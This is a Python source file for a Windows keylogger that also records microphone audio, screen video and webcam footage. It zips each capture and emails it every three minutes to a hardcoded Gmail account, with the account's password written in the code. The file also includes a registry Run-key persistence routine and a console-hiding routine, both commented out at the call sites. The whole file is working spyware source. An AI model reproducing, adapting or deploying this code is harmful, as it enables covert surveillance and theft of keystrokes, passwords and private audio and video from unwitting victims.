from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

from threading import Timer
from datetime import datetime
import keyboard
import shutil

import time
import os
import sys
from winreg import *

from scipy.io.wavfile import write
import sounddevice as sd

import pyautogui
import cv2
import numpy as np

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

send_report_every=180
email_address = "mailtemptesting@gmail.com" # Enter disposable email here
email_password = "Vr@jM@ilT3sting" # Enter email password here
toaddr = "mailtemptesting@gmail.com"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def addStartup(self):  # this will add the file to the startup registry key
        fp = os.path.dirname(os.path.realpath(__file__))
        file_name = sys.argv[0].split('\\')[-1]
        new_file_path = fp + '\\' + file_name
        keyVal = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
        key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ,new_file_path)

    def Hide(self):
        import win32console
        import win32gui
        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, filename, attachment, toaddr):
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "Log File"
        body = "This mail contains KeyLogs, Audio recording, Screen Recording, WebCam Recording of specific time interval as an attachment below"
        msg.attach(MIMEText(body,'plain'))

        filename = filename + ".zip"
        attachment = attachment + ".zip"
        attachment = open(attachment, 'rb')

        p=MIMEBase('application','octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)

        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        text = msg.as_string()
        server.sendmail(fromaddr, toaddr, text)
        server.quit()

    def microphone(self):
        fs = 44100
        seconds = 30
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.audio_information = f"audio-{start_dt_str}_{end_dt_str}.wav"
        write(self.audio_information,fs,myrecording)

    def screenrecorder(self):
        resolution = (1920,1080)
        codec = cv2.VideoWriter_fourcc(*"XVID")
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.recordingfile = f"screenrecording-{start_dt_str}_{end_dt_str}.avi"
        fps = 1.0
        out = cv2.VideoWriter(self.recordingfile,codec,fps,resolution)
        capture_duration = 25
        start_time = time.time()
        while (int(time.time() - start_time)<capture_duration):
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame,cv2.COLOR_BGR2RGB)
            out.write(frame)
        out.release()
        cv2.destroyAllWindows()

    def videocapturing(self):
        capture_duration = 10
        cap = cv2.VideoCapture(0,cv2.CAP_DSHOW)
        if (cap.isOpened() == False):
            print("Error reading video file")

        frame_width = int(cap.get(3))
        frame_height = int(cap.get(4))

        size = (frame_width,frame_height)
        fourcc = cv2.VideoWriter_fourcc(*'MJPG')
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.capturingfile = f"webcam-{start_dt_str}_{end_dt_str}.avi"
        out = cv2.VideoWriter(self.capturingfile,fourcc,1,size)

        start_time = time.time()
        while(int(time.time() - start_time)<capture_duration):
            ret,frame = cap.read()
            if ret == True:
                out.write(frame)
            else:
                break
        cap.release()
        out.release()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                # self.Hide()
                self.report_to_file()
                self.microphone()
                self.screenrecorder()
                self.videocapturing()
                start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
                end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
                _dir = './'
                _dir = os.path.join(_dir, start_dt_str+"_"+end_dt_str)
                if not os.path.exists(_dir):
                    os.makedirs(_dir)
                shutil.move(self.filename+".txt",_dir)
                shutil.move(self.audio_information,_dir)
                print(f"[+] Saved {self.audio_information}")
                shutil.move(self.recordingfile,_dir)
                print(f"[+] Saved {self.recordingfile}")
                shutil.move(self.capturingfile,_dir)
                print(f"[+] Saved {self.capturingfile}")
                shutil.make_archive(start_dt_str+"_"+end_dt_str,'zip',_dir)
                _dir = _dir[2:]
                self.sendmail(email_address, email_password, _dir, _dir,toaddr)
                print("Email Sent!")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=send_report_every, report_method="email")
    # keylogger.addStartup()
    keylogger.start()
